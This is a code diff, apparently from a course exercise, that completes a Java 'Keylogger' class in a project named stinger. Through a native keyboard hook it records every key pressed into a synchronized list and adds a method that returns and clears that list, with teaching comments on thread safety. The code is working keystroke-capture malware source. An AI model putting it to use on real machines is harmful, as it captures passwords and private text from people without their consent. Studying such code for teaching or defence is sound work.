@@ -2,6 +2,10 @@ package stinger.os.keylogger;
 
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
+import stinger.StingerEnvironment;
+
+import java.util.ArrayList;
+import java.util.List;
 
 public class Keylogger implements NativeKeyListener {
     // TODO: IMPLEMENT
@@ -15,22 +19,42 @@ public class Keylogger implements NativeKeyListener {
     // You're free to do whatever as long as it works really. Just try and don't leave the
     // confines of this/KeyloggerStoreTask class.
 
-    public Keylogger() {
+    private final List<Integer> mKeyCodes;
 
+    public Keylogger(StingerEnvironment environment) {
+        mKeyCodes = new ArrayList<>();
     }
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent event) {
-        String keyText = NativeKeyEvent.getKeyText(event.getKeyCode());
     }
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent event) {
-        String keyText = NativeKeyEvent.getKeyText(event.getKeyCode());
+        // This is called because someone pressed a key on the keyboard.
+        // Let's save the keycode into the list.
+        //
+        // The synchronized is necessary to provide data safety when working with multiple threads.
+        // but we haven't learned concurrency so its okay if you didn't do this and don't understand why.
+        synchronized (mKeyCodes) {
+            mKeyCodes.add(event.getKeyCode());
+        }
     }
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent event) {
-        String keyText = NativeKeyEvent.getKeyText(event.getKeyCode());
+    }
+
+    public List<Integer> getKeyCodes() {
+        // Make a copy of the original key codes. Clear the list because
+        // we don't need it multiple times and return the copy.
+        //
+        // The synchronized is necessary to provide data safety when working with multiple threads.
+        // but we haven't learned concurrency so its okay if you didn't do this and don't understand why.
+        synchronized (mKeyCodes) {
+            List<Integer> copy = new ArrayList<>(mKeyCodes);
+            mKeyCodes.clear();
+            return copy;
+        }
     }
 }
